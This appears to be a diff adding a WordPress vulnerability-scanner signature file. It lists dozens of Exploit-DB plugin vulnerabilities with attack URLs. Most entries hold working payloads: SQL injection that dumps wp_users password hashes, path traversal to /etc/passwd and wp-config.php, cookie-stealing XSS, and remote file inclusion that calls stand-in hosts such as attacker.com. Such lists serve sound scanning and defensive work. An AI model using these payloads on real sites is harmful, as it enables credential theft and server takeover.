+URL: /wp-content/plugins/media-library-categories/sort.php?termid=-1 UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
+URL: /wp-content/plugins/media-library-categories/sort.php?termid=1 AND EXTRACTVALUE(1,CONCAT(CHAR(92),@@version))
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17627/
+Exploit Title: UPM Polls &lt;= 1.0.3 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/upm-polls/includes/poll_logs.php?qid=-1 UNION ALL SELECT NULL,CONCAT(CHAR(96),@@version,CHAR(96)),NULL,NULL,NULL,NULL-- '.replace(' ', '%20')
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17617/
+Exploit Title: Social Slider &lt;= 5.6.5 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/social-slider-2/ajax.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17616/
+Exploit Title: ProPlayer plugin &lt;= 4.7.7 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/proplayer/playlist-controller.php?pp_playlist_id=-1') UNION ALL SELECT NULL,NULL,@@version--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17602/
+Exploit Title: WordPress TimThumb Plugin - Remote Code Execution
+Author: MaXe
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17465/
+URL: /wp-admin/edit-tags.php?taxonomy=link_category&amp;orderby=[SQL
+URL: /wp-admin/edit-tags.php?taxonomy=post_tag&amp;orderby=[SQL
+URL: /wp-admin/edit-tags.php?taxonomy=category&amp;orderby=[SQL
+URL: /wp-admin/link-manager.php?orderby=[SQL
+Author', could be applied to the user.
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17453/
+Exploit Title: Wordpress - Beer Recipes v.1.0 XSS
+Author: TheUzuki.'
+Author: TheUzuki.' from HF
+Author will be not responsible for any damage.
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17423/
+Exploit Title: 0-Day WPtouch WordPress Plugin 1.9.27 URL redirection
+Author: MaKyOtOx (special Pwet to ansx &amp; Zizounette for #bitcoins)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17299/
+Exploit Title: is-human (1.4.2 and prior) Worpdress plugin.
+Author: neworder [www.neworder-ind.net] 
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17284/
+Author : kaMtiEz (kamtiez@exploit-id.com)								                               ##
+URL: /wp-content/plugins/editormonkey.tar.gz
+URL: /wp-content/plugins/editormonkey/fckeditor/editor/filemanager/upload/test.html
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17214/
+Author.....: [ Ma3sTr0-Dz ]
+URL: /wp-content/plugins/sermon-browser/sermon.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17207/
+URL: /wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php' script to properly sanitize user-supplied input.
+URL: /wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php?savepostcat&amp;post_id=1&amp;category_id=SQL_CODE_HERE
+URL: /wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php?get_form_countries&amp;cat_id=SQL_CODE_HERE
+URL: /wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php?admin&amp;category_level=2&amp;category_id=1%20union%20select%201,user%28%29,3,4,5,6,7,8,9,version%28%29%20--%201
+URL: /wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php' script to properly sanitize user-supplied input in 'category_id' variable.
+URL: /wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php?admin&amp;category_id=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17119/
+Author..................AutoSec Tools
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16947/
+URL: /wp-content/plugins/flash-album-gallery/lib/hitcounter.php' script to properly sanitize user-supplied input in 'pid' variable.
+URL: /wp-content/plugins/flash-album-gallery/lib/hitcounter.php?
+URL: /wp-content/plugins/flash-album-gallery/admin/news.php' script to properly sanitize user-supplied input in 'want2Read' variable.
+URL: /wp-content/plugins/flash-album-gallery/admin/news.
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16895/
+Author'         =&gt; [ 'str0ke &lt;str0ke [at] milw0rm.com&gt;', 'hdm' ],
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16251/
+Author..................AutoSec Tools
+URL: /wp-content/plugins/old-post-spinner/logview.php?ops_file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16250/
+Author..................AutoSec Tools
+URL: /wp-content/plugins/jquery-mega-menu/skin.php?skin=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16236/
+URL: /wp-content/plugins/iwant-one-ihave-one/updateAJAX.php' script to properly sanitize user-supplied input in 'post_id' variable.
+URL: /wp-content/plugins/iwant-one-ihave-one/updateAJAX.php?post
+URL: /wp-content/plugins/iwant-one-ihave-one/updateAJAX.php' script to properly sanitize user-supplied input in 'post_id' variable.
+URL: /wp-content/plugins/iwant-one-ihave-one/updateAJAX.php?add=
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16235/
+URL: /wp-content/plugins/forum-server/feed.php' script to properly sanitize user-supplied input in 'topic' variable.
+URL: /wp-content/plugins/forum-server/feed.php?topic=1%20union%2
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16233/
+Exploit Title: Relevanssi User Searches WordPress plugin Stored XSS
+Author: Saif El-Sherei
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16232/
+Exploit Title: GigPress 2.1.10 wordpress plugin Stored XSS
+Author: Saif El-Sherei
+Author released an update to fix this issue
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16221/
+URL: /wp-content/plugins/comment-rating/comment-rating-options.php' script, it's possible to generate an error that will reveal the full path of the script.
+URL: /wp-content/plugins/comment-rating/comment-rating-options.php
+URL: /wp-content/plugins/comment-rating/ck-processkarma.php' script to properly sanitize user-supplied input in 'id' variable.
+URL: /wp-content/plugins/comment-rating/ck-processkarma.php?path=1&amp;action=1&amp;id=1%20and%201=2%20--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16181/
+Exploit Title: WordPress User Photo Component Remote File Upload Vulnerability
+Author: ADVtools
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/16144/
+Author or higher
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/15943/
+URL: /wp-content/plugins/mingle-forum/feed.php?topic=0%20UNION%20SELECT%201,user_email,3,4,5,user_login,7%20FROM%20wp_users%20%23
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/15858/
+Exploit Title: Wordpress 3.0.3 stored XSS IE7,6 NS8.1
+Author: Saif
+URL: /wp-admin/post.php HTTP/1.1
+URL: /wp-admin/post.php?post=145&amp;action=edit&amp;message=1
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/15808/
+Exploit Title: WORDPRESS Plugin Accept Signups PERSISTENT XSS
+Author: clshack
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/15684/
+Author role).
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/15513/
+Author: k3m4n9i
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/14923/
+Author: Craw
+URL: /wp-admin/admin.php?page=events-manager-people
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/14541/
+Author : kaMtiEz (kamzcrew@yahoo.com)								   ##
+URL: /wp-content/plugins/nextgen-smooth-gallery/nggSmoothFrame.php?galleryID=[VALID ID][BLIND-SQL]
+URL: /wp-content/plugins/nextgen-smooth-gallery/nggSmoothFrame.php?galleryID=31[BLIND-SQL]
+URL: /wp-content/plugins/nextgen-smooth-gallery/nggSmoothFrame.php?galleryID=34[BLIND-SQL]
+URL: /wp-content/plugins/nextgen-smooth-gallery/nggSmoothFrame.php?galleryID=2[BLIND-SQL]
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/14441/
+Exploit Title: Word Press SQL Injection ( in myLDlinker.php Plugin )                   
+Author: H-SK33PY                      
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/14308/
+Exploit Title: Wordpress firestats remote configuration file download
+Author: Jelmer de Hen
+URL: /wp-content/plugins/firestats/php/tools/get_config.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/14198/
+Author: ADEO Security
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/14057/
+URL: /wp-content/plugins/cimy-counter/cimy_counter.php
+URL: /wp-content/plugins/cimy-counter/cc_redirect.php?cc=Downloads&amp;fn=%0A1
+URL: /wp-content/plugins/cimy-counter/cc_redirect.php?cc=Downloads&amp;fn=http://websecurity.com.ua
+URL: /wp-content/plugins/cimy-counter/cc_redirect.php?cc=Downloads&amp;fn=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2b
+URL: /wp-content/plugins/cimy-counter/cc_redirect.php?cc=TestCounter&amp;fn=%0AHeader:test
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/12098/
+URL: /wp-content/plugins/nextgen-gallery/xml/media-rss.php?mode=%3Cscript%3Ealert(1)%3C/script%3E 
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/11458/
+Author : kaMtiEz (kamzcrew@yahoo.com)								   ##
+URL: /wp-content/plugins/cpl/cplphoto.php?postid=[INDONESIANCODER]&amp;id=[VALID ID]
+URL: /wp-content/plugins/cpl/cplphoto.php?postid=11+and+1=1+union+all+select+1,2,concat(user_login,0x3a,user_pass),4,5,6,7,8,9,10,11,12+from+wp_users--&amp;id=11
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/10535/
+Author: Gamoscu
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/10325/
+Exploit Title: Wordpress Image Manager Plugins Shell Upload Vulnerability
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/10228/
+URL: /wp-content/plugins/wp-cumulus/wp-cumulus.php
+URL: /wp-content/plugins/wp-cumulus/tagcloud.swf?mode=tags&amp;tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/10090/
+URL: /wp-admin/profile.php&gt; tmp.html
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/10088/
+URL: /wp-admin/admin.php?page=/collapsing-archives/options.txt
+URL: /wp-admin/admin.php?page=akismet/readme.txt
+URL: /wp-admin/admin.php?page=related-ways-to-take-action/options.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/9890/
+Author	: Don Tukulesto (root@indonesiancoder.com)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/9431/
+URL: /wp-content/plugins/wp-syntax/test/index.php?test_filter[wp_head][99][0]=pi&amp;test_filter[wp_head][99][1]=cos&amp;test_filter[wp_head][99][2]=phpinfo
+URL: /wp-content/plugins/wp-syntax/test/index.php?test_filter[wp_head][99][0]=session_start&amp;test_filter[wp_head][99][1]=session_id&amp;test_filter[wp_head][99][2]=system HTTP/1.0
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/9150/
+Author: ManhLuat93 [at] hcegroup[dot]net
+URL: /wp-admin/post-new.php?page=mycategoryorder&amp;mode=act_OrderCategories&amp;parentID=0'&amp;idString=3,5,4,1
+URL: /wp-admin/post-new.php?page=mycategoryorder&amp;mode=act_OrderCategories&amp;parentID=0 UNION SELECT 1,@@version,3,4,5,6,7,8,9,10,11--&amp;idString=3,5,4,1
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/9110/
+Author or Subscriber (the latter has the least privileges)
+URL: /wp-admin/options-general.php
+URL: /wp-admin/admin.php?page=/collapsing-archives/options.txt
+URL: /wp-admin/options-general.php?page=collapsing-archives/options.txt
+URL: /wp-admin/admin.php?page=akismet/readme.txt
+URL: /wp-admin/options-general.php?page=related-ways-to-take-action/options.php
+URL: /wp-admin/admin.php?page=related-ways-to-take-action/options.php
+URL: /wp-admin/admin.php?page=wp-security-scan/securityscan.php
+URL: /wp-admin/index.php?page=wp-ids/ids-admin.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/9054/
+URL: /wp-content/plugins/related-sites/BTE_RW_webajax.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/9048/
+Author : Stack
+URL: /wp-content/plugins/dm-albums/
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/9043/
+Author : Septemb0x
+URL: /wp-content/plugins/dm-albums/template/album.php?SECURITY_FILE=http://attackersite/shell.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/8961/
+Author: Kacper
+URL: /wp-content/plugins/photoracer/viewimg.php?id=-1+union+select+0,1,2,3,4,user(),6,7,8--
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/8791/
+Author : TurkGuvenligi
+URL: /wp-content/plugins/wp-lytebox/main.php?pg=../../../../../../../../../../../../../../../../etc/profile%00
+URL: /wp-content/plugins/wp-lytebox/main.php?pg=../../../../../../../../../../../../../../../../var/log/apache2/access_log&amp;cmd=[RCE]
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/8229/
+Author: strange kevin
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/8196/
+URL: /wp-admin/profile.php&gt; tmp.html
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/7738/
+Author: [[seomafia]]
+URL: /wp-content/plugins/wp-forum/forum_feed.php?thread=[SQL]
+URL: /wp-content/plugins/wp-forum/forum_feed.php?thread=-99999+union+select+1,2,3,concat(user_login,0x2f,user_pass,0x2f,user_email),5,6,7+from+wp_users/*
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/7543/
+URL: /wp-content/plugins/page-flip-image-gallery/books/getConfig.php?book_id=../../../../../../../../../../../etc/passwd%00123
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/6867/
+URL: /wp-content/plugins/wp-shopping-cart/ directory.
+URL: /wp-content/plugins/wp-shopping-cart/'
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/6842/
+Author: boom3rang
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/6777/
+Author: r45c4l 
+URL: /wp-content/plugins/st_newsletter/stnl_iframe.php?newsletter=-9999+UNION+SELECT+concat(user_login,0x3a,user_pass,0x3a,user_email)+FROM+wp_users--
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/6127/
+URL: /wp-content/plugins/downloads-manager/upload/' method='post' enctype='multipart/form-data' name='upload'&gt;
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/5486/
+Author : 1ten0.0net1
+URL: /wp-content/plugins/wpSS/
+URL: /wp-content/plugins/wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&amp;display=plain
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/5326/
+Author: BL4CK
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/5194/
+URL: /wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=http://attacker.tld/shell.txt?
+URL: /wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+URL: /wp-content/plugins/sniplets/view/sniplets/notice.php?text=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+URL: /wp-content/plugins/sniplets/view/sniplets/inset.php?text=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+URL: /wp-content/plugins/sniplets/view/admin/submenu.php?url=%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+URL: /wp-content/plugins/sniplets/modules/execute.php?text=%3Cli%3E
+URL: /wp-content/plugins/sniplets/view/admin/pager.php?page=%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+URL: /wp-content/plugins/sniplets/modules/execute.php?text=%3C?php%20system(%22ls%22);
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/5035/
+URL: /wp-admin/admin.php?page=dmsguestbook&amp;advanced=1&amp;folder=language/&amp;file=../../../../wp-config.php
+URL: /wp-admin/admin.php?page=dmsguestbook&amp;advanced=1&amp;folder=language/&amp;file=../../../../../../../../../../../../../../../../etc/passwd
+URL: /wp-admin/admin.php?page=dmsguestbook&amp;advanced=1&amp;folder=language/&amp;file=&lt;script&gt;alert('XSS')&lt;/script&gt;
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/4993/
+Author : Houssamix From H-T Team
+URL: /wp-content/plugins/fgallery/
+URL: /wp-content/plugins/fgallery/fim_rss.php ~~~~~~~~~~~~~
+URL: /wp-content/plugins/fgallery/fim_rss.php?album=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6,7%20from%20wp_users--
+URL: /wp-content/plugins/fgallery/fim_rss.php?album=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6,7%20from%20wp_users--
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/4992/
+Author : Houssamix From H-T Team
+URL: /wp-content/plugins/wp-cal/
+URL: /wp-content/plugins/wp-cal/functions/editevent.php ~~~~~~~~~~~~~
+URL: /wp-content/plugins/wp-cal/functions/editevent.php?id=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6%20from%20wp_users--
+URL: /wp-content/plugins/wp-cal/functions/editevent.php?id=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6%20from%20wp_users--
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/4844/
+URL: /wp-content/plugins/wp-filemanager/ajaxfilemanager/ajaxfilemanager.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/4695/
+URL: /wp-content/plugins/pictpress/resize.php?size=../../../../../../../../../../&amp;path=/etc/passwd%00
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/4593/
+Author: S.W.A.T.
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/3828/
+Author: Crackers_Child
+URL: /wp-content/plugins/myflash/myflash-button.php?wpPATH=Shl3?
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/3825/
+Author         : M.Hasran Addahroni
+URL: /wp-content/plugins/wordtube/wordtube-button.php?wpPATH=http://attacker.com/evil?
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/3824/
+Author         : M.Hasran Addahroni
+URL: /wp-content/plugins/wp-table/js/wptable-button.phpp?wpPATH=http://attacker.com/evil?
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/3051/
+Author: xoron
+URL: /wp-content/plugins/Enigma2.php?boarddir=http://evil_scripts?
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/1145/
+Authors'  =&gt; [ 'str0ke' ],
+*END
